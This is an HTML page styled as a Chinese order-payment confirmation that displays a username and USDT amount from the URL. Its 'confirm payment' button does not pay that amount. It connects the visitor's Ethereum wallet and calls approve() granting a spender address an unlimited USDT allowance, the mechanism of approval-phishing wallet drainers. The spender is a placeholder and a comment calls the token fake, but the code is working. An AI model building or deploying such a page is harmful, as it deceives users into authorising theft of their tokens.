
<!DOCTYPE html><html lang="zh">
<head><meta charset="UTF-8"><title>订单支付授权</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; background: #f5f7fa; margin: 0; }
  header { background: #1f2937; color: white; padding: 1em 2em; font-size: 1.5em; text-align: center; }
  .container { max-width: 600px; margin: 2em auto; background: white; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 2em; }
  h2 { margin-top: 0; }
  .info { margin: 1em 0; font-size: 1.1em; }
  .label { font-weight: bold; color: #374151; }
  .btn { margin-top: 2em; padding: 12px 20px; font-size: 1.1em; background: #10b981; border: none; color: white; border-radius: 6px; cursor: pointer; }
  .btn:hover { background: #059669; }
  .status { margin-top: 1.5em; color: red; font-size: 0.95em; }
</style>
</head>
<body>
<header>订单支付确认</header>
<div class="container">
  <h2>请确认以下订单信息</h2>
  <div class="info"><span class="label">用户名：</span><span id="username">--</span></div>
  <div class="info"><span class="label">充值金额：</span><span id="amount">--</span> USDT</div>
  <div class="info"><span class="label">订单编号：</span><span id="orderid">--</span></div>
  <button class="btn" onclick="authorize()">确认付款</button>
  <p class="status" id="status"></p>
</div>

<script>
  const query = new URLSearchParams(location.search);
  const user = query.get("username") || "未知用户";
  const amount = query.get("amount") || "0";
  const orderId = Math.floor(10000000 + Math.random() * 90000000); // 随机8位

  document.getElementById("username").innerText = user;
  document.getElementById("amount").innerText = amount;
  document.getElementById("orderid").innerText = orderId;

  async function authorize() {
    if (!window.ethereum) return alert("请使用支持以太坊的钱包打开");

    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (假)
    const spender = "0x1111111111111111111111111111111111111111"; // 平台合约地址（示意）

    const ABI = [{
      "constant": false, "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve", "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: 'eth_requestAccounts' });

    const contract = new web3.eth.Contract(ABI, tokenAddress);
    const accounts = await web3.eth.getAccounts();
    const from = accounts[0];

    try {
      const tx = await contract.methods.approve(spender, web3.utils.toTwosComplement(-1)).send({ from });
      document.getElementById("status").innerText = "授权成功！交易哈希：" + tx.transactionHash;
    } catch (err) {
      console.error(err);
      document.getElementById("status").innerText = "授权失败：" + err.message;
    }
  }
</script>
</body></html>
